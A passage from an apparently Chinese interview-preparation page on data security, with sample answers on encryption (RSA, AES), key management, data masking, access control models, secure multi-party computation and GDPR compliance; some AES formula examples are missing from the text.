RSA（一种非对称加密算法）中，发送方使用接收方的公钥对消息进行加密，接收方使用自己的私钥进行解密。</li></ul></li><li>主要特点<ul><li><strong>安全性高</strong>：由于公钥和私钥是成对出现的，且私钥由接收方妥善保管，即使公钥被泄露，攻击者也很难通过公钥推算出私钥，从而保证了信息的安全性。</li><li><strong>加密速度相对较慢</strong>：非对称加密的算法通常比对称加密复杂，涉及到更复杂的数学运算，如大整数的幂运算等。因此，在处理大量数据时，加密速度会明显慢于对称加密。</li></ul></li><li>适用场景<ul><li><strong>数字签名</strong>：非对称加密在数字签名方面有广泛应用。发送方可以使用自己的私钥对消息进行签名，接收方使用发送方的公钥来验证签名的真实性。这样可以确保消息的来源可靠，并且在传输过程中没有被篡改。</li><li><strong>密钥交换</strong>：在对称加密系统中，为了解决密钥分发的安全问题，可以先使用非对称加密来安全地交换对称加密所需的密钥。例如，在建立安全的网络连接（如 SSL&#x2F;TLS 协议）时，通过非对称加密交换对称加密的会话密钥。</li></ul></li></ul></li><li><h4 id="加密算法原理："><a href="#加密算法原理：" class="headerlink" title="加密算法原理："></a><strong>加密算法原理</strong>：</h4></li><li><p>考查对加密算法基本原理的掌握程度，如 “你能简单描述一下 AES 算法的加密过程吗？”</p><ol><li><p><strong>AES（高级加密标准）算法概述</strong></p><ul><li>AES 是一种对称加密算法，广泛应用于数据加密领域。它的加密过程主要包括多个轮次的变换操作，这些操作作用在数据块上，将明文转换为密文。AES 算法支持 128 位、192 位和 256 位的密钥长度，密钥长度不同，加密轮数也不同，分别是 10 轮、12 轮和 14 轮。下面以 128 位密钥长度（10 轮加密）为例来介绍其加密过程。</li></ul></li><li><p><strong>字节替换（SubBytes）</strong></p><ul><li><strong>作用</strong>：这是 AES 加密的第一步，它通过一个查找表（S - 盒）对输入数据块中的每个字节进行替换，这个操作主要是为了提供非线性变换，增加加密的复杂性。</li><li><strong>示例</strong>：假设输入数据块是一个 16 字节（128 位）的数组，每个字节的值在 0 - 255 之间。对于其中的任意一个字节，比如值为，通过查找 S - 盒，可以得到一个新的值来替换原来的。S - 盒是一个精心设计的置换表，它的设计使得字节替换操作具有混淆特性，让攻击者难以通过统计分析等方法来破解加密。</li></ul></li><li><p><strong>行移位（ShiftRows）</strong></p><ul><li><p><strong>作用</strong>：在字节替换之后，行移位操作主要是对数据块进行置换。它将数据块看作一个的字节矩阵，对矩阵的每一行进行循环左移操作，其中第一行不移动，第二行左移 1 个字节，第三行左移 2 个字节，第四行左移 3 个字节。</p></li><li><p><strong>示例</strong>：如果把字节替换后的 16 字节数据排列成如下矩阵形式：</p><p>经过行移位操作后，矩阵变为：</p><p>这种置换操作改变了字节之间的顺序，进一步增加了加密的安全性。</p></li></ul></li><li><p><strong>列混合（MixColumns）</strong></p><ul><li><strong>作用</strong>：列混合操作是对数据块中的列进行混合变换，它将每一列的 4 个字节看作一个多项式，然后与一个固定的多项式进行乘法运算，再对结果取模。这个操作使得每个字节的变化不仅依赖于自身，还依赖于同一列的其他字节，扩散了字节的影响范围。</li><li><strong>示例</strong>：对于数据块矩阵的某一列，通过列混合运算后变为，其中是通过对与固定多项式进行复杂的乘法和取模运算得到的。例如，（这里的乘法和加法是在有限域上进行的，其中系数 2 和 3 是在该有限域中的特殊定义）。</li></ul></li><li><p><strong>轮密钥加（AddRoundKey）</strong></p><ul><li><strong>作用</strong>：这一步是将经过前面一系列变换的数据块与轮密钥进行按位异或操作。轮密钥是由原始密钥通过密钥扩展算法生成的，每一轮加密都有一个对应的轮密钥。这个操作使得加密结果依赖于密钥，不同的密钥会产生完全不同的加密结果。</li><li><strong>示例</strong>：如果经过列混合后的 16 字节数据块是，当前轮的 16 字节轮密钥是，那么轮密钥加操作后的结果为（其中表示按位异或操作）。</li></ul></li><li><p><strong>多轮加密循环</strong></p><ul><li>上述的字节替换、行移位、列混合和轮密钥加四个步骤构成了 AES 算法的一轮加密。对于 128 位密钥长度的 AES 加密，需要进行 10 轮这样的操作。每一轮的操作都会使得数据块更加混乱和扩散，经过多轮加密后，最终得到的结果就是密文。</li></ul></li></ol></li><li><h4 id="密钥管理："><a href="#密钥管理：" class="headerlink" title="密钥管理："></a><strong>密钥管理</strong>：</h4></li><li><p>了解候选人对密钥生成、存储、分发和更新等密钥管理环节的认知，例如，“在企业级数据加密中，如何确保密钥的安全性？”</p></li><li><p>密钥生成环节的安全性</p><ul><li><strong>使用可靠的密钥生成工具</strong>：选择经过严格测试和认证的密码学库或工具来生成非对称加密密钥对（公钥和私钥）。例如，在许多编程语言中，都有成熟的密码学库，像 Python 中的<code>cryptography</code>库，它利用操作系统提供的安全随机数生成器来创建高质量的密钥对。这些库会确保生成的密钥在数学上具有足够的强度，以抵抗密码分析攻击。</li><li><strong>遵循密码学标准</strong>：按照既定的密码学标准来生成密钥。以 RSA 算法为例，密钥生成过程涉及到选择两个大素数，其大小和选取方式应该符合相关的安全建议。一般来说，密钥长度越长，安全性越高。目前，推荐的 RSA 密钥长度至少为 2048 位，以应对日益增长的计算能力和攻击手段。这是因为较长的密钥使得攻击者通过分解大整数（RSA 算法安全性的基础在于分解大整数的困难性）来获取私钥变得极其困难。</li></ul></li><li><p>私钥存储的安全措施</p><ul><li><strong>硬件安全模块（HSM）存储</strong>：硬件安全模块是保护私钥的一种非常有效的物理设备。它提供了一个隔离的、防篡改的环境来存储私钥。例如，一些金融机构会使用符合 FIPS（联邦信息处理标准）认证的 HSM 来存储用于数字签名和加密通信的 RSA 私钥。这些 HSM 设备通常具有物理防护机制，如抗冲击、抗电磁干扰等，并且通过严格的访问控制来确保只有授权的操作才能访问私钥。</li><li><strong>加密存储私钥</strong>：如果不使用 HSM，也应该对私钥进行加密存储。可以使用对称加密算法（如 AES）来加密私钥，加密密钥（称为密钥加密密钥，KEK）则通过安全的方式存储（如存储在受保护的密码库或安全的硬件设备中）。这样，即使存储私钥的设备被入侵，攻击者如果没有获取 KEK，也无法解密私钥。例如，在一个企业的密钥管理系统中，将 RSA 私钥加密后存储在企业内部的安全服务器上，只有经过授权的用户通过提供正确的 KEK 才能解密和使用私钥。</li></ul></li><li><p>公钥分发的安全考虑</p><ul><li><strong>数字证书机制</strong>：在公钥分发过程中，为了确保公钥的真实性和完整性，通常会使用数字证书。数字证书是由权威的证书颁发机构（CA）颁发的，它将公钥与实体（如企业、个人等）的身份信息绑定在一起。例如，在网站的 SSL&#x2F;TLS 加密通信中，网站的公钥会包含在数字证书中。当用户访问网站时，浏览器会验证证书的有效性，包括检查证书是否由信任的 CA 颁发、证书是否过期等。这样可以防止攻击者伪造公钥来进行中间人攻击。</li><li><strong>安全的通信渠道分发公钥</strong>：在一些情况下，需要直接分发公钥而不是通过数字证书。这时，应该使用安全的通信渠道，如通过 SSL&#x2F;TLS 加密的网络连接或者使用安全的文件传输协议（如 SFTP）。例如，在企业内部的加密通信系统中，部门之间分发用于加密消息的公钥时，应该确保通信渠道的安全性，防止公钥在传输过程中被篡改。</li></ul></li><li><p>密钥更新与吊销机制</p><ul><li><strong>定期更新密钥对</strong>：为了应对潜在的安全风险，如密码学算法的破解进展或者密钥可能的泄露风险，应该定期更新非对称加密密钥对。例如，对于企业用于数字签名的 RSA 密钥对，根据业务的安全需求，可以设定每一年或两年更新一次。更新过程需要确保新密钥的安全生成、存储和分发，同时要妥善处理旧密钥的吊销和存档。</li><li><strong>密钥吊销列表（CRL）与在线证书状态协议（OCSP）</strong>：在使用数字证书的场景下，需要建立密钥吊销机制。当私钥可能被泄露或者不再有效时，应该及时吊销对应的公钥证书。可以通过维护密钥吊销列表（CRL）或者使用在线证书状态协议（OCSP）来实现。例如，当企业发现用于网站加密的私钥可能被泄露时，会将对应的数字证书添加到 CRL 中，浏览器在验证证书时会检查 CRL，从而防止攻击者继续使用已吊销的证书进行非法活动。</li></ul></li><li><p>访问控制与审计</p><ul><li><strong>严格的访问控制策略</strong>：对非对称加密密钥的访问应该实施严格的基于角色的访问控制（RBAC）策略。只有经过授权的人员（如企业的安全管理员、具有特定业务需求的开发人员等）才能访问和使用密钥。例如，在一个电子签名系统中，只有被授权的签名者才能使用对应的私钥进行数字签名，其他人员无法访问该私钥。</li><li><strong>密钥访问审计与监控</strong>：建立密钥访问的审计和监控机制，记录所有与密钥访问相关的活动，包括访问时间、访问者身份、操作类型（如密钥生成、使用、更新等）。通过对这些审计记录的分析，可以及时发现异常的密钥访问行为，例如，发现某个未经授权的用户试图访问私钥，就可以及时采取措施进行调查和防范。</li></ul></li></ul><h3 id="数据脱敏技术"><a href="#数据脱敏技术" class="headerlink" title="数据脱敏技术"></a>数据脱敏技术</h3><ul><li><h4 id="脱敏方法与策略"><a href="#脱敏方法与策略" class="headerlink" title="脱敏方法与策略"></a><strong>脱敏方法与策略</strong></h4></li><li><p>可以问 “请列举几种常见的数据脱敏方法，并说明它们在保护敏感数据中的作用。” 如数据屏蔽、数据替换、数据扰动等方法。</p></li><li><p>数据屏蔽（Masking）</p><ul><li><strong>方法描述</strong>：数据屏蔽是一种常见的数据脱敏方法，它通过用特定的字符或符号替换敏感数据的部分或全部内容来隐藏真实信息。例如，对于手机号码 “138xxxxxxxx”，可以将中间四位数字用 “<em>” 替换，变成 “138</em>***xxxx”；对于银行卡号，可以只显示开头几位和结尾几位数字，中间部分用 “XXX” 替换。</li><li><strong>保护作用</strong>：这种方法能够在保持数据格式完整性的同时，有效地隐藏敏感信息。在数据展示或测试环境中使用时，不会泄露真实的敏感数据，同时又能让用户或测试人员对数据的大致格式和类型有直观的了解。例如，在软件开发的测试环境中，使用屏蔽后的敏感数据可以确保测试人员不会意外接触到真实的用户隐私信息，同时还能进行功能测试，如验证数据输入框的格式是否正确等。</li></ul></li><li><p>数据替换（Substitution）</p><ul><li><strong>方法描述</strong>：数据替换是将敏感数据替换为虚构的或通用的数据。例如，在处理客户姓名时，可以将真实姓名替换为 “张三”“李四” 等通用名字；对于地理位置信息，可以将具体的详细地址替换为大致的区域，如将 “北京市朝阳区 XX 小区 XX 号楼 XX 单元 XX 室” 替换为 “北京市朝阳区”。</li><li><strong>保护作用</strong>：通过替换敏感数据，可以避免真实信息的泄露，同时在一定程度上保持数据的可用性。在数据分析场景中，这种方法可以用于统计分析等用途。例如，在分析用户地域分布时，使用替换后的地理位置数据可以得到大致的区域分布情况，而不会涉及具体的用户隐私地址。</li></ul></li><li><p>数据扰动（Perturbation）</p><ul><li><strong>方法描述</strong>：数据扰动是在原始数据的基础上，通过添加噪声或随机化等方式对数据进行轻微修改。例如，对于年龄数据，如果原始数据是 30 岁，可以在一个合理的范围内（如 ±3 岁）添加随机噪声，得到一个扰动后的年龄数据，如 32 岁。对于数值型数据，还可以采用更复杂的统计方法进行扰动，如根据数据的分布特征添加符合一定分布规律的噪声。</li><li><strong>保护作用</strong>：这种方法可以在不改变数据整体统计特征的前提下，保护敏感数据的隐私。在数据分析和数据挖掘场景中，它允许在保护隐私的情况下，仍然能够利用数据进行一些宏观的统计分析和模型训练。例如，在进行市场调研数据分析时，通过数据扰动后的用户收入数据，仍然可以大致了解用户收入的分布情况，同时又能防止个别用户收入信息的泄露。</li></ul></li><li><p>数据匿名化（Anonymization）</p><ul><li><strong>方法描述</strong>：数据匿名化是通过删除或转换能够直接或间接识别个人身份的信息，使得数据主体无法被识别。这可能涉及到删除姓名、身份证号码、联系方式等直接标识符，同时也会对一些准标识符（如性别、年龄、职业等组合起来可能识别个人身份的信息）进行处理。例如，采用 k - 匿名技术，确保在数据集中每个个体的信息与至少其他个个体的信息相同，从而无法通过这些信息单独识别出某一个体。</li><li><strong>保护作用</strong>：数据匿名化是一种较为彻底的数据保护方法，它使得数据在使用过程中不会泄露个人隐私信息。在大数据分析和数据共享场景中，匿名化后的数据可以被广泛地用于研究、统计等合法用途。例如，医疗机构在共享患者的医疗数据用于医学研究时，通过匿名化处理，可以在不侵犯患者隐私的情况下，为医学研究提供有价值的数据支持。</li></ul></li><li><p>数据加密（Encryption）</p><ul><li><strong>方法描述</strong>：虽然加密本身主要用于数据的保密性保护，但在某些数据脱敏场景下也可以作为一种特殊的数据脱敏方法。通过加密敏感数据，只有拥有解密密钥的授权用户才能访问真实数据。例如，对于企业的核心商业机密数据，采用高级加密标准（AES）等加密算法进行加密存储，在需要使用数据时，通过严格的密钥管理和授权流程进行解密。</li><li><strong>保护作用</strong>：加密提供了一种高强度的数据保护方式。在数据存储和传输过程中，即使数据被非法获取，没有解密密钥，攻击者也无法获取敏感数据的真实内容。在数据共享场景中，如果接收方没有解密密钥，只能得到加密后的密文，从而保护了数据的隐私。例如，在云计算环境中，企业将敏感数据存储在云端，通过加密可以确保云服务提供商无法获取数据的真实内容。</li></ul></li><li><h4 id="脱敏效果评估"><a href="#脱敏效果评估" class="headerlink" title="脱敏效果评估"></a><strong>脱敏效果评估</strong></h4></li><li><p>关注候选人是否能够评估数据脱敏后的可用性和安全性之间的平衡，例如，“如何衡量数据脱敏后是否既能有效保护隐私，又能满足业务需求？”</p></li><li><p><strong>隐私保护效果衡量</strong></p><ul><li>隐私泄露风险评估<ul><li><strong>模拟攻击测试</strong>：通过模拟攻击者的行为来评估隐私泄露风险。例如，采用差分隐私中的隐私预算概念，在数据脱敏前后分别进行模拟攻击，计算攻击者能够获取敏感信息的概率变化。如果脱敏后攻击者获取隐私信息的概率显著降低，说明隐私保护有效。例如，对于金融交易数据，模拟黑客试图通过脱敏后的交易金额和时间戳来推断用户身份，若无法准确推断，则隐私保护有效。</li><li><strong>敏感信息识别难度衡量</strong>：评估经过脱敏处理后，敏感信息被识别的难度。例如，对于个人身份信息（姓名、身份证号等），可以使用信息熵等指标来衡量。信息熵越高，说明信息的不确定性越大，即敏感信息越难被识别。如将姓名脱敏为随机字符串后，计算其信息熵，若信息熵达到一定程度，表明隐私保护程度较高。</li></ul></li><li>合规性检查<ul><li><strong>参考法规和行业标准</strong>：依据相关的数据保护法规（如欧盟的 GDPR、中国的《数据安全法》）和行业特定标准（如医疗行业的 HIPAA）进行检查。确保数据脱敏后的处理方式符合法规对于隐私保护的最低要求。例如，医疗数据脱敏后，应确保患者的隐私信息不能被用于非授权的医疗研究或商业用途，符合 HIPAA 规定。</li><li><strong>隐私政策匹配度评估</strong>：对比企业内部的隐私政策与数据脱敏后的实际情况。企业的隐私政策通常规定了如何处理和保护用户数据，检查脱敏后的操作是否与隐私政策一致。例如，企业隐私政策声明不会泄露用户的地理位置信息，那么在数据脱敏后，地理位置信息应通过合适的方式（如精度降低或匿名化）进行保护。</li></ul></li></ul></li><li><p><strong>业务需求满足程度衡量</strong></p><ul><li>数据准确性评估<ul><li><strong>数据一致性检查</strong>：在数据脱敏后，检查数据的一致性。例如，在一个销售数据集中，脱敏后的销售金额和销售数量之间的乘积应该等于脱敏后的总销售额。对于关联数据，如客户订单信息和物流信息，检查它们之间的关联关系在脱敏后是否仍然正确。如果数据一致性能够得到保证，说明数据准确性在一定程度上得到维护，有利于业务操作。</li><li><strong>关键指标保留情况</strong>：确定业务关键指标在脱敏后是否仍然可用。例如，在市场调研数据中，对于消费者购买频率、品牌偏好等关键指标，通过对比脱敏前后的数据分布和统计特征，如均值、中位数、标准差等，评估这些指标是否能够准确反映业务情况。如果关键指标变化不大，说明数据脱敏没有对业务分析造成重大影响。</li></ul></li><li>数据可用性评估<ul><li><strong>数据分析和挖掘可行性</strong>：将脱敏后的数据用于实际的数据分析和挖掘任务，观察是否能够得到有意义的结果。例如，在一个客户关系管理系统中，使用脱敏后的数据进行客户细分（聚类分析）或客户流失预测（分类分析）。如果这些分析任务能够正常进行，并且得到的结果与使用原始数据得到的结果具有相似的业务指导意义，说明数据脱敏后的可用性较高。</li><li><strong>业务流程适应性评估</strong>：检查数据脱敏后是否能够顺利融入现有的业务流程。例如，在一个金融信贷审批流程中，脱敏后的用户信用数据应能够被信贷审批系统正常读取和处理，不会因为数据格式或内容的变化而导致业务流程中断或错误。如果数据脱敏后的格式和内容能够满足业务流程中各个环节的需求，如数据输入、查询、报表生成等，说明它能够很好地满足业务需求。</li></ul></li></ul></li><li><h3 id="数据访问控制技术"><a href="#数据访问控制技术" class="headerlink" title="数据访问控制技术"></a>数据访问控制技术</h3><ul><li><strong>访问控制模型</strong>：考查对常见访问控制模型（如 RBAC - 基于角色的访问控制、ABAC - 基于属性的访问控制）的理解，如 “请比较 RBAC 和 ABAC 模型的优缺点，并举例说明它们的应用场景。”<ol><li><strong>RBAC（基于角色的访问控制）模型</strong><ul><li>优点<ul><li><strong>简单易理解和管理</strong>：RBAC 模型的概念直观，易于理解。它将用户与角色相关联，角色再与权限相关联。例如，在一个企业的办公系统中，可创建 “员工”“部门经理”“系统管理员” 等角色。系统管理员只需将用户分配到相应角色，就能快速赋予用户一组权限，而不必为每个用户单独配置权限，大大简化了权限管理的复杂性。</li><li><strong>权限分配高效</strong>：当企业组织结构或业务流程发生变化时，只需要调整角色的权限，所有关联该角色的用户权限会自动更新。比如企业新增了一个业务模块，只需为 “部门经理” 这个角色添加对新模块的访问权限，所有部门经理用户就都能获得此权限。</li><li><strong>符合企业组织结构</strong>：RBAC 模型与企业的实际组织结构和分工紧密匹配。它能很好地反映企业中不同职位所拥有的权限范围，方便进行访问控制。例如，财务部门的员工通常有访问财务系统的权限，而通过 RBAC 可以很容易地将财务系统的相关权限赋予 “财务员工” 这一角色。</li></ul></li><li>缺点<ul><li><strong>角色定义可能过于僵化</strong>：RBAC 的角色是预先定义好的，在面对复杂多变的业务场景时可能不够灵活。例如，在一个项目型的工作环境中，员工可能会根据项目的不同阶段或任务临时需要不同的权限，而 RBAC 很难快速满足这种动态变化的权限需求。</li><li><strong>权限颗粒度有限</strong>：如果需要对权限进行非常精细的控制，RBAC 可能会力不从心。例如，对于一个文件共享系统，可能需要根据文件的类型、创建时间、所属部门等多个因素来确定用户是否能访问，单纯依靠 RBAC 角色来分配权限会比较困难。</li></ul></li><li>应用场景<ul><li><strong>企业办公系统</strong>：如企业资源规划（ERP）系统、客户关系管理（CRM）系统等。在 ERP 系统中，可定义 “采购人员”“销售人员”“仓库管理人员” 等角色，每个角色具有相应的系统操作权限，如采购人员可以创建采购订单、销售人员可以查看客户信息和销售记录、仓库管理人员可以管理库存等。</li><li><strong>内部网络资源访问控制</strong>：在企业内部网络中，通过 RBAC 控制员工对不同部门共享文件夹、打印机等资源的访问。例如，“行政部门员工” 角色可以访问行政部门的共享文件和打印机，而其他部门员工则没有此权限。</li></ul></li></ul></li><li><strong>ABAC（基于属性的访问控制）模型</strong><ul><li>优点<ul><li><strong>高度灵活和动态</strong>：ABAC 根据用户、资源、环境等多个属性来决定访问权限，能够很好地适应复杂多变的业务需求。例如，在一个云存储服务中，用户的访问权限可以根据用户的身份（如普通用户、高级用户）、文件属性（如文件类型、文件所有者）、访问时间（如工作时间、非工作时间）等多个属性来动态确定。</li><li><strong>精细的权限控制</strong>：ABAC 可以实现非常精细的权限控制，能够考虑到各种复杂的因素。例如，在一个医疗信息系统中，医生访问患者病历的权限可以根据医生的科室、患者的病情严重程度、病历的创建日期等多个属性来确定，确保只有相关的医生在合适的情况下才能访问患者的特定病历。</li><li><strong>上下文感知能力强</strong>：ABAC 能够考虑访问请求的上下文信息，如网络环境、设备类型等。例如，对于一个银行的网上银行系统，根据用户登录的设备类型（是通过安全的银行专用设备还是普通的移动设备）、网络环境（是在银行内部网络还是外部公共网络）等属性来动态调整用户的访问权限，提高系统的安全性。</li></ul></li><li>缺点<ul><li><strong>复杂性高</strong>：ABAC 的策略配置和管理相对复杂，需要考虑多个属性及其组合，这对管理员的要求较高。例如，在一个大型企业的复杂系统中，要定义基于用户、资源、时间、地点等多个属性的访问策略，需要花费大量的时间和精力来设计和维护这些策略。</li><li><strong>性能开销较大</strong>：由于每次访问请求都需要评估多个属性和策略，可能会对系统性能产生一定的影响。特别是在高并发的场景下，这种性能开销可能会更加明显。例如，在一个拥有大量用户的电商平台，每次用户访问商品信息或进行交易操作时，都需要对用户的多个属性（如会员等级、信用等级、购买历史等）和商品的属性（如商品类别、促销状态等）进行评估，以确定访问权限，这可能会导致系统响应时间延长。</li></ul></li><li>应用场景<ul><li><strong>云计算和大数据环境</strong>：在云计算平台中，根据用户、资源（如虚拟机、存储卷）和环境（如数据中心位置、网络带宽）等属性来控制用户对云资源的访问。在大数据平台中，对数据的访问权限可以根据数据的敏感性（如个人隐私数据、商业机密数据）、用户的角色和数据处理任务的属性等来动态确定。</li><li><strong>物联网（IoT）系统</strong>：在物联网系统中，设备的访问权限可以根据设备的类型（如传感器、执行器）、设备的所有者、设备的运行状态、网络连接情况等属性来控制。例如，只有经过授权的用户在设备正常运行且网络连接安全的情况下才能访问和控制智能门锁设备。</li></ul></li></ul></li></ol></li><li><strong>权限管理系统</strong>：询问候选人对权限管理系统的设计、实施和维护的经验，例如，“在设计一个权限管理系统时，需要考虑哪些关键因素？”</li></ul></li><li><p>数据备份与恢复技术</p><ul><li><strong>备份策略与方案</strong>：例如，“请描述一下企业数据中心常用的备份策略，如全量备份、增量备份和差异备份的特点和适用场景。”</li><li><strong>恢复流程与技术</strong>：了解候选人对数据恢复流程的熟悉程度，如 “在遇到数据丢失或损坏的情况下，如何快速有效地恢复数据？”</li></ul></li><li><p>安全多方计算和同态加密（如果职位要求涉及高级技术）</p><ul><li><p><strong>原理与应用场景</strong>：可以问 “请解释安全多方计算的基本原理，并举例说明它在数据共享场景中的应用。” 对于同态加密，可问 “同态加密是如何实现在密文上进行计算的？请举例说明其在云计算环境中的潜在应用。”</p><p>安全多方计算的基本原理是允许多个参与方在不泄露各自输入隐私数据的前提下，共同计算一个函数的结果. 以下是对其基本原理及相关技术的介绍 ：</p><ul><li><strong>秘密共享</strong>：将一个秘密分割成多个部分，即份额，每个份额分给不同的参与方。只有当一定数量的份额组合时，秘密才能被重建。例如，将一个数据值拆分成三个份额分别给 A、B、C 三方，单独任何一方都无法得知原始数据，只有当至少两方合在一起才能恢复出原始数据，从而保证了数据在存储和传输过程中的安全性。</li><li><strong>混淆电路</strong>：把任何函数的计算问题转化为由 “与” 门、“或” 门和 “非” 门组成的布尔逻辑电路，再利用加密技术构建加密版本的布尔逻辑电路。参与方通过交换混淆后的电路信息，在不泄露原始数据的情况下进行计算。</li><li><strong>同态加密</strong>：允许对密文进行计算，计算结果在解密后与在明文上直接计算的结果相同。同态加密分为部分同态加密、浅同态加密和全同态加密，全同态加密能实现任意次的加法和乘法同态运算，可在不解密数据的情况下对加密数据进行各种数学运算，大大提高了数据处理的灵活性和安全性。</li></ul><p>以下是安全多方计算在数据共享场景中的一些应用：</p><h3 id="金融领域"><a href="#金融领域" class="headerlink" title="金融领域"></a>金融领域</h3><ul><li><strong>联合风险评估</strong>：不同金融机构之间需要共享客户数据来更准确地评估客户的信用风险，但又不能泄露各自客户的隐私信息 。通过安全多方计算，各机构可以在加密的状态下共享客户的相关数据，如收入、资产、信用记录等，然后共同计算客户的风险评分，而无需将原始数据暴露给其他机构。例如，银行 A、B、C 分别拥有客户的部分财务信息和交易记录，它们使用安全多方计算技术，在不公开这些敏感数据的前提下，共同计算出客户的综合风险评估结果，从而决定是否批准客户的贷款申请，既保护了客户隐私，又提高了风险评估的准确性.</li><li><strong>金融市场数据分析</strong>：多家金融机构或投资公司可能希望联合分析市场数据，以获取更全面的市场趋势和投资机会，但又担心数据泄露会影响自身竞争力。利用安全多方计算，各方可以在保护自身数据隐私的情况下，共同对市场数据进行挖掘和分析，如计算市场波动率、相关性等指标，为投资决策提供更有力的支持.</li></ul><h3 id="医疗领域"><a href="#医疗领域" class="headerlink" title="医疗领域"></a>医疗领域</h3><ul><li><strong>多中心医学研究</strong>：不同医院或研究机构可能收集了大量的患者数据，包括病历、检查结果、基因数据等。在进行医学研究时，需要整合这些数据，但又要严格保护患者的隐私。通过安全多方计算，各机构可以在不泄露患者具体信息的情况下，共同对数据进行统计分析、模型训练等操作，例如研究某种疾病的遗传因素，各方可以在加密数据上进行联合计算，找出疾病相关的基因标记，促进医学研究的发展，同时确保患者隐私得到充分保护.</li><li><strong>远程医疗诊断</strong>：在远程医疗中，患者的医疗数据可能分布在不同的医疗机构或设备中。医生需要综合这些数据来进行准确的诊断，但又不能直接获取患者在其他机构的原始数据。安全多方计算可以使各方在保护数据隐私的前提下，共享和整合患者数据，为医生提供更全面的诊断依据，提高远程医疗的质量和可靠性 。</li></ul><h3 id="商业领域"><a href="#商业领域" class="headerlink" title="商业领域"></a>商业领域</h3><ul><li><strong>供应链数据共享</strong>：在供应链中，各环节的企业拥有不同的敏感数据，如生产计划、库存水平、销售数据等。通过安全多方计算，这些企业可以在不暴露自身核心数据的情况下，与其他企业共享部分数据，实现供应链的协同优化，如共同制定生产计划、优化库存管理等，提高整个供应链的效率和竞争力。</li><li><strong>广告投放与精准营销</strong>：广告商和互联网平台希望通过共享用户数据来实现更精准的广告投放，但又要保护用户的隐私。利用安全多方计算，双方可以在加密的用户数据上进行联合计算，找出目标用户群体，制定个性化的广告投放策略，而不会泄露用户的具体个人信息，提高广告效果的同时保护用户隐私.</li></ul></li></ul></li></ul><ol><li><p>数据安全法规与合规性</p><ul><li>法律法规知识<ul><li><strong>通用法规</strong>：考查候选人对数据保护相关法律法规的了解，如 “请列举一些国内和国际上重要的数据保护法规，如欧盟的 GDPR、中国的《数据安全法》，并说明它们对企业数据安全的主要要求。”</li><li><strong>行业特定法规</strong>：针对特定行业（如金融、医疗、电商），询问候选人对行业数据安全法规的熟悉程度，例如，“在金融行业，数据安全要遵循哪些特殊的监管要求？”</li></ul></li><li>合规性实践<ul><li><strong>合规框架搭建</strong>：了解候选人如何帮助企业搭建数据安全合规框架，如 “请描述一下你在之前的工作中是如何协助企业建立符合 GDPR 要求的数据安全管理体系的？”<ol><li><strong>数据映射与清单编制</strong><ul><li><strong>识别数据资产</strong>：首先，我会与企业的各个部门（如市场、销售、人力资源等）合作，开展数据资产清查工作。这包括识别企业收集、存储和处理的所有个人数据类型，例如客户姓名、联系方式、购买历史、员工个人信息等。通过与业务流程负责人的访谈、审查文档和系统扫描等方式，全面梳理企业内的数据流动路径。</li><li><strong>绘制数据流程图</strong>：根据收集到的信息，绘制详细的数据流程图，展示数据从产生、收集、存储、处理到最终删除或归档的全过程。例如，在电商企业中，会详细描绘客户下单过程中数据如何从网页表单收集，经过支付系统处理，存储在订单数据库，以及后续用于营销目的的处理流程。这些流程图有助于直观地理解数据的生命周期和涉及的系统、人员，为后续的合规性评估和控制措施实施提供基础。</li></ul></li><li><strong>隐私政策制定与更新</strong><ul><li><strong>符合 GDPR 原则的政策制定</strong>：基于 GDPR 的要求，协助企业制定或更新隐私政策。确保政策明确说明数据主体（如客户、员工）的权利，包括访问权、更正权、删除权（被遗忘权）等。例如，在隐私政策中清晰地告知客户如何申请访问自己的个人数据，以及企业将在多长时间内响应客户的请求。同时，政策要说明数据收集的目的、合法性基础（如同意、合同必要、合法利益等）和数据共享的范围。</li><li><strong>隐私政策的透明度和易理解性</strong>：注重隐私政策的表述方式，使其易于被数据主体理解。避免使用过于复杂的法律术语，采用通俗易懂的语言向用户解释数据处理活动。并且通过企业网站、移动应用等渠道显著地展示隐私政策链接，确保用户在提供个人数据之前能够方便地查阅。</li></ul></li><li><strong>数据主体权利保障机制建立</strong><ul><li><strong>访问和更正请求处理流程</strong>：建立一套高效的流程来处理数据主体的访问和更正请求。指定专门的团队或人员负责接收和处理这些请求，明确每个环节的时间限制和操作规范。例如，规定在收到客户访问个人数据的请求后，必须在 30 天内提供相应的数据副本。对于更正请求，要确保在核实身份后及时更新相关数据记录。</li><li><strong>删除权（被遗忘权）执行程序</strong>：针对数据主体的删除请求，制定详细的执行程序。这涉及到对数据存储系统的全面检索，确保与该数据主体相关的所有数据，包括备份和存档数据，都能被安全地删除或匿名化处理。同时，要考虑到数据删除可能对其他业务流程产生的影响，如关联数据的清理和系统之间的同步。</li></ul></li><li><strong>数据安全措施实施</strong><ul><li><strong>技术安全控制</strong>：根据企业数据的敏感性和风险评估结果，实施一系列技术安全措施。包括加密敏感数据存储（如使用 AES 等加密算法对客户的个人信息数据库进行加密）、采用访问控制技术（如 RBAC 或 ABAC 模型来限制员工对数据的访问权限）和数据防泄露技术（如 DLP 工具来监控和防止数据意外或恶意泄露）。</li><li><strong>数据安全培训与意识提升</strong>：组织数据安全培训活动，提高全体员工的数据安全意识。培训内容包括 GDPR 的基本要求、数据保护的最佳实践、常见的安全威胁（如网络钓鱼、社会工程学攻击）以及员工在数据安全中的职责。通过案例分析、模拟演练等方式，使员工能够更好地理解和遵守数据安全规定。</li></ul></li><li><strong>数据处理合法性评估与记录保存</strong><ul><li><strong>合法性基础审查</strong>：对企业的数据处理活动进行合法性评估，确保每一项数据收集和处理行为都有合法的依据。这可能包括获得数据主体的明确同意（如在收集用户营销偏好数据时）、基于合同必要（如处理员工工资数据）或合法利益（如为了防止欺诈而处理客户交易数据）等情况。同时，记录下每一次数据处理活动的合法性基础，以备监管机构检查。</li><li><strong>记录保存要求满足</strong>：按照 GDPR 的规定，协助企业建立完善的记录保存制度。记录保存的数据包括数据处理活动的描述、数据主体的类别和数量、数据处理的目的、数据存储的位置和期限等信息。这些记录要以可被监管机构查阅的形式保存一定的时间（通常为数据处理活动结束后的数年）。</li></ul></li><li><strong>数据跨境传输管理</strong><ul><li><strong>跨境传输合法性评估</strong>：如果企业涉及数据跨境传输（如将欧盟境内收集的客户数据传输到欧盟境外的数据中心进行存储或处理），对跨境传输的合法性进行评估。确保跨境传输符合 GDPR 